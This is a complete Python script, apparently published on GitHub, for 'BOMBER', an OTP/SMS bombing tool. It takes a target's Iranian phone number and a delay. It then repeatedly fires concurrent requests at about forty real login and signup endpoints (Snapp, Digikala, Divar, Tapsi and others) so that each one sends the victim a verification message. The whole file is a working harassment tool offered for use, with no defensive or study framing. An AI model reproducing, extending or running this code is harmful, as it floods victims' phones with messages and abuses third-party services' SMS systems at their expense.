#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
BOMBER - OTP Attack Tool
Created by ihosi
Version: 4.0 (Custom Loop Delay)
GitHub: https://github.com/ihosi/Bomber
"""

import requests
import concurrent.futures
import time
import json
import os
import sys
import random
from datetime import datetime

# ===== Check for colorama =====
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        RED = '\033[91m'; GREEN = '\033[92m'; YELLOW = '\033[93m'
        BLUE = '\033[94m'; MAGENTA = '\033[95m'; CYAN = '\033[96m'
        WHITE = '\033[97m'; RESET = '\033[0m'
    class Style:
        RESET_ALL = '\033[0m'

# ===== Global variable =====
running = True

def signal_handler(sig, frame):
    global running
    print(f"\n\n{Fore.RED}🛑 Stopping attacks... Please wait...{Style.RESET_ALL}")
    running = False

import signal
signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_line(color=Fore.CYAN, length=60):
    """Print a separator line"""
    print(f"{color}─" * length + Style.RESET_ALL)

def print_banner():
    """Simple banner without boxes"""
    banner = f"""
{Fore.YELLOW}██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗
{Fore.YELLOW}██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
{Fore.YELLOW}██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
{Fore.YELLOW}██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
{Fore.YELLOW}██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
{Fore.YELLOW}╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝

{Fore.CYAN}         ✦ OTP BOMBER TOOL ✦

{Fore.GREEN}Created by: {Fore.WHITE}ihosi
{Fore.GREEN}Version: {Fore.WHITE}4.0 (Custom Loop Delay)
{Fore.GREEN}GitHub: {Fore.WHITE}github.com/ihosi/Bomber
{Style.RESET_ALL}
"""
    print(banner)

def print_header():
    """Simple header with line separators"""
    print_line(Fore.CYAN)
    print(f"{Fore.CYAN}⚡ BOMBER - OTP Attack Tool")
    print(f"{Fore.CYAN}👑 Creator: ihosi")
    print(f"{Fore.CYAN}🔄 Version: 4.0 (Custom Loop Delay)")
    print(f"{Fore.CYAN}⏱  You choose the delay between attacks!")
    print(f"{Fore.RED}Press CTRL+C to stop")
    print_line(Fore.CYAN)

def print_phone_input():
    """Phone number input section with lines"""
    print_line(Fore.GREEN)
    print(f"{Fore.GREEN}📱 Enter phone number (e.g., 09123456789)")
    print(f"{Fore.RED}Press CTRL+C to exit")
    print_line(Fore.GREEN)
    print(f"{Fore.YELLOW}➜ {Fore.WHITE}", end="")

def print_delay_input():
    """Delay input section with lines"""
    print_line(Fore.MAGENTA)
    print(f"{Fore.MAGENTA}⏱ Enter delay between attacks (seconds)")
    print(f"{Fore.GREEN}Examples: 0.1, 0.5, 1, 2, 5, 10")
    print_line(Fore.MAGENTA)
    print(f"{Fore.YELLOW}➜ {Fore.WHITE}", end="")

def print_start_info(phone_number, delay):
    """Start attack info with lines"""
    print_line(Fore.GREEN)
    print(f"{Fore.GREEN}🚀 Starting attacks on: {Fore.YELLOW}{phone_number}")
    print(f"{Fore.GREEN}⏱  Delay between attacks: {Fore.YELLOW}{delay} seconds")
    print_line(Fore.GREEN)
    print(f"{Fore.WHITE}⏳ Sending requests...")
    print(f"{Fore.RED}⚠ Press CTRL+C to stop")
    print_line(Fore.CYAN)

def print_status(attack_num, sent, failed, error, total, delay):
    """Print status in one line"""
    status_line = f"{Fore.CYAN}[{attack_num:>4}] {Fore.GREEN}📤 Sent: {sent:>3}  {Fore.RED}❌ Failed: {failed:>3}  {Fore.YELLOW}⚠ Error: {error:>3}  {Fore.BLUE}📊 Total: {total}  {Fore.MAGENTA}⏱ Delay: {delay}s{Style.RESET_ALL}"
    print(status_line)

def print_final_stats(phone_number, delay, attack_num, total_apis, total_time):
    """Final statistics with lines"""
    print_line(Fore.CYAN)
    print(f"{Fore.CYAN}📊 FINAL STATISTICS")
    print_line(Fore.CYAN)
    print(f"{Fore.WHITE}📱 Phone: {Fore.YELLOW}{phone_number}")
    print(f"{Fore.WHITE}⏱  Delay: {Fore.YELLOW}{delay}s")
    print(f"{Fore.WHITE}🔄 Total Attacks: {Fore.YELLOW}{attack_num}")
    print(f"{Fore.WHITE}📊 APIs per Attack: {Fore.YELLOW}{total_apis}")
    print(f"{Fore.WHITE}📤 Total Requests: {Fore.YELLOW}{attack_num * total_apis}")
    print(f"{Fore.WHITE}⏱  Total Time: {Fore.YELLOW}{total_time}s")
    print_line(Fore.CYAN)

def print_continue():
    """Continue prompt with lines"""
    print_line(Fore.GREEN)
    print(f"{Fore.GREEN}🔄 Try again? (y/n)")
    print_line(Fore.GREEN)
    print(f"{Fore.YELLOW}➜ {Fore.WHITE}", end="")

def print_goodbye(attack_num):
    """Goodbye message with lines"""
    print_line(Fore.GREEN)
    print(f"{Fore.GREEN}👋 Thanks for using BOMBER! - ihosi")
    print(f"{Fore.GREEN}📊 Total attacks performed: {Fore.YELLOW}{attack_num}")
    print_line(Fore.GREEN)

def get_apis(phone_number):
    apis = [
        {"name": "Snapp V1", "url": "https://api.snapp.ir/api/v1/sms/link", "data": {"phone": phone_number}, "method": "POST"},
        {"name": "Snapp V2", "url": f"https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone={phone_number}", "data": {"cellphone": phone_number}, "method": "POST"},
        {"name": "Achareh", "url": "https://api.achareh.co/v2/accounts/login/", "data": {"phone": f"98{phone_number[1:]}"}, "method": "POST"},
        {"name": "Zigap", "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp", "data": {"phoneNumber": f"+98{phone_number[1:]}"}, "method": "POST"},
        {"name": "Jabama", "url": "https://gw.jabama.com/api/v4/account/send-code", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Banimode", "url": "https://mobapi.banimode.com/api/v2/auth/request", "data": {"phone": phone_number}, "method": "POST"},
        {"name": "Classino", "url": "https://student.classino.com/otp/v1/api/login", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Digikala V1", "url": "https://api.digikala.com/v1/user/authenticate/", "data": {"username": phone_number, "otp_call": False}, "method": "POST"},
        {"name": "Digikala V2", "url": "https://api.digikala.com/v1/user/forgot/check/", "data": {"username": phone_number}, "method": "POST"},
        {"name": "Sms.ir", "url": "https://appapi.sms.ir/api/app/auth/sign-up/verification-code", "data": phone_number, "method": "POST"},
        {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "data": {"phoneNumber": phone_number[1:]}, "method": "POST"},
        {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "data": {"phone": phone_number}, "method": "POST"},
        {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "data": {"username": phone_number}, "method": "POST"},
        {"name": "Bikoplus", "url": "https://bikoplus.com/account/check-phone-number", "data": {"phoneNumber": phone_number}, "method": "POST"},
        {"name": "Mootanroo", "url": "https://api.mootanroo.com/api/v3/auth/send-otp", "data": {"PhoneNumber": phone_number}, "method": "POST"},
        {"name": "Tap33", "url": "https://tap33.me/api/v2/user", "data": {"credential": {"phoneNumber": phone_number, "role": "BIKER"}}, "method": "POST"},
        {"name": "Tapsi", "url": "https://api.tapsi.ir/api/v2.2/user", "data": {"credential": {"phoneNumber": phone_number, "role": "DRIVER"}, "otpOption": "SMS"}, "method": "POST"},
        {"name": "GapFilm", "url": "https://core.gapfilm.ir/api/v3.1/Account/Login", "data": {"Type": "3", "Username": phone_number[1:]}, "method": "POST"},
        {"name": "IToll", "url": "https://app.itoll.com/api/v1/auth/login", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Anargift", "url": "https://api.anargift.com/api/v1/auth/auth", "data": {"mobile_number": phone_number}, "method": "POST"},
        {"name": "Nobat", "url": "https://nobat.ir/api/public/patient/login/phone", "data": {"mobile": phone_number[1:]}, "method": "POST"},
        {"name": "Lendo", "url": "https://api.lendo.ir/api/customer/auth/send-otp", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Hamrah-Mechanic", "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp", "data": {"PhoneNumber": phone_number}, "method": "POST"},
        {"name": "Abantether", "url": "https://abantether.com/users/register/phone/send/", "data": {"phoneNumber": phone_number}, "method": "POST"},
        {"name": "OKCS", "url": "https://my.okcs.com/api/check-mobile", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Tebinja", "url": "https://www.tebinja.com/api/v1/users", "data": {"username": phone_number}, "method": "POST"},
        {"name": "Bit24", "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Rojashop", "url": "https://rojashop.com/api/send-otp-register", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Paklean", "url": "https://client.api.paklean.com/download", "data": {"tel": phone_number}, "method": "POST"},
        {"name": "Khodro45", "url": "https://khodro45.com/api/v1/customers/otp/", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Delino", "url": "https://www.delino.com/user/register", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "DigikalaJet", "url": "https://api.digikalajet.ir/user/login-register/", "data": {"phone": phone_number}, "method": "POST"},
        {"name": "Miare", "url": "https://www.miare.ir/api/otp/driver/request/", "data": {"phone_number": phone_number}, "method": "POST"},
        {"name": "Dosma", "url": "https://app.dosma.ir/api/v1/account/send-otp/", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Ostadkr", "url": "https://api.ostadkr.com/login", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Sibbazar", "url": "https://sandbox.sibbazar.com/api/v1/user/invite", "data": {"username": phone_number}, "method": "POST"},
        {"name": "Namava", "url": "https://www.namava.ir/api/v1.0/accounts/login/by-otp/request", "data": {"UserName": f"+98{phone_number[1:]}"}, "method": "POST"},
        {"name": "Shab", "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile", "data": {"mobile": phone_number}, "method": "POST"},
        {"name": "Bitpin", "url": "https://api.bitpin.org/v2/usr/signin/", "data": {"phone": phone_number}, "method": "POST"},
        {"name": "Taaghche", "url": "https://gw.taaghche.com/v4/site/auth/signup", "data": {"contact": phone_number}, "method": "POST"},
    ]
    return apis

def send_single_request(api, phone_number):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    try:
        data = api["data"]
        method = api.get("method", "POST").upper()
        
        if method == "GET":
            response = requests.get(
                api["url"],
                params=data if isinstance(data, dict) else {},
                headers=headers,
                timeout=5
            )
        else:
            if isinstance(data, str):
                response = requests.post(
                    api["url"],
                    data=data,
                    headers=headers,
                    timeout=5
                )
            else:
                response = requests.post(
                    api["url"],
                    json=data,
                    headers=headers,
                    timeout=5
                )
        
        return {
            "name": api["name"],
            "status_code": response.status_code,
            "status": "sent" if response.status_code in [200, 201, 202, 204, 400, 401, 403] else "failed"
        }
    except:
        return {
            "name": api["name"],
            "status_code": None,
            "status": "error"
        }

def send_all_requests(phone_number, attack_num):
    apis = get_apis(phone_number)
    results = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        future_to_api = {
            executor.submit(send_single_request, api, phone_number): api
            for api in apis
        }
        
        for future in concurrent.futures.as_completed(future_to_api):
            result = future.result()
            results.append(result)
    
    sent = sum(1 for r in results if r["status"] == "sent")
    failed = sum(1 for r in results if r["status"] == "failed")
    error = sum(1 for r in results if r["status"] == "error")
    
    return sent, failed, error, results

def main():
    global running
    
    if sys.version_info < (3, 6):
        print(f"{Fore.RED}⚠ Python 3.6 or higher is required!{Style.RESET_ALL}")
        sys.exit(1)
    
    clear_screen()
    print_banner()
    print_header()
    
    while True:
        # ===== Get Phone Number =====
        print_phone_input()
        
        try:
            phone_input = input().strip()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}👋 Goodbye! - ihosi{Style.RESET_ALL}")
            sys.exit(0)
        
        if not phone_input:
            print(f"{Fore.RED}⚠ Please enter a phone number!{Style.RESET_ALL}")
            continue
        
        phone_number = phone_input.replace(' ', '').replace('-', '').replace('+', '')
        
        if not phone_number.startswith('09') and not phone_number.startswith('9'):
            print(f"{Fore.RED}⚠ Phone must start with 09 or 9!{Style.RESET_ALL}")
            continue
        
        if phone_number.startswith('09') and len(phone_number) != 11:
            print(f"{Fore.RED}⚠ Phone must be 11 digits (09123456789){Style.RESET_ALL}")
            continue
        elif phone_number.startswith('9') and len(phone_number) != 10:
            print(f"{Fore.RED}⚠ Phone must be 10 digits (9123456789){Style.RESET_ALL}")
            continue
        
        # ===== Get Loop Delay =====
        print_delay_input()
        
        try:
            delay_input = input().strip()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}👋 Goodbye! - ihosi{Style.RESET_ALL}")
            sys.exit(0)
        
        try:
            delay = float(delay_input)
            if delay < 0:
                print(f"{Fore.RED}⚠ Delay must be positive!{Style.RESET_ALL}")
                continue
        except:
            print(f"{Fore.RED}⚠ Invalid number! Please enter a valid number (e.g., 0.1, 1, 2){Style.RESET_ALL}")
            continue
        
        # ===== Start Attacks =====
        clear_screen()
        print_banner()
        print_header()
        
        print_start_info(phone_number, delay)
        print()
        
        attack_num = 0
        total_apis = len(get_apis(phone_number))
        start_time_total = time.time()
        
        running = True
        
        try:
            while running:
                attack_num += 1
                attack_start = time.time()
                
                # Send all requests simultaneously
                sent, failed, error, results = send_all_requests(phone_number, attack_num)
                attack_end = time.time()
                attack_time = round(attack_end - attack_start, 2)
                
                # Show status
                print_status(attack_num, sent, failed, error, total_apis, delay)
                
                # Wait for the specified delay
                if running:
                    time.sleep(delay)
                
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}🛑 Stopped by user!{Style.RESET_ALL}")
            running = False
        
        total_time = round(time.time() - start_time_total, 2)
        
        # ===== Final Statistics =====
        print_final_stats(phone_number, delay, attack_num, total_apis, total_time)
        
        # ===== Ask to continue =====
        print_continue()
        
        try:
            choice = input().strip().lower()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}👋 Goodbye! - ihosi{Style.RESET_ALL}")
            sys.exit(0)
        
        if choice != 'y' and choice != 'yes':
            print_goodbye(attack_num)
            break
        
        clear_screen()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}👋 Goodbye! - ihosi{Style.RESET_ALL}")
        sys.exit(0)